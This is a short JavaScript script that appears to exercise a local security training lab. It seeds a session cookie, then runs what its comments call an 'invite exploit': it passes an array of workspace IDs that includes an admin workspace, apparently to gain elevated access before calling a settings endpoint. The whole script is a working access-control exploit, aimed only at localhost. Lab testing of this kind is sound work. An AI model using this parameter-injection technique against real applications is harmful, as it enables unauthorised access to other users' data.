

async function run() {
    try {
        // 0. Initialize session first
        console.log("[0] Seeding initial session via /me...");
        const initRes = await fetch("http://localhost:3000/api/labs/a06-9/me");
        const initCookie = initRes.headers.get('set-cookie');
        console.log("Initial Cookie:", initCookie);

        // 1. Generate a fake session by triggering the invite exploit locally
        console.log("[1] Triggering invite exploit...");
        const inviteRes = await fetch("http://localhost:3000/api/labs/a06-9/invite", {
            method: "POST",
            headers: { 
                "Content-Type": "application/json",
                "Cookie": initCookie
            },
            body: JSON.stringify({ 
                email: "tester@test.com", 
                workspace_id: ["WS_GUEST_101", "WS_ADMIN_SECRET_999"] 
            })
        });
        
        const setCookie = inviteRes.headers.get('set-cookie') || initCookie;
        console.log("Cookie for settings step:", setCookie);

        // 2. Call the settings API with the same cookie!
        console.log("[2] Testing Settings API call with valid session...");
        const settingsRes = await fetch("http://localhost:3000/api/labs/a06-9/settings", {
            method: "POST",
            headers: { 
                "Content-Type": "application/json",
                "Cookie": setCookie
            },
            body: JSON.stringify({ 
                theme: "dark", 
                layout: "grid", 
                isVaultUnlocked: false 
            })
        });
        const output = await settingsRes.json();
        console.log("API RESPONSE STATUS:", settingsRes.status);
        console.log("API RESPONSE BODY:", output);

    } catch (e) {
        console.error("SCRIPT FAILED:", e);
    }
}

run();
